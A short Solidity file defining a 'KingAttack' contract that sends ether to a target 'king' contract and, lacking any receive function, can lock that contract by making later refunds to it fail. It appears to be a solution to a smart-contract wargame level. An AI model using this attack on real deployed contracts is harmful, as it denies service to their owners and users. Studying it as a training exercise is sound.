// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
    function attack(address king_) public payable {
        (bool result, ) = king_.call{value: msg.value}("");
        if (!result) revert();
    }
}
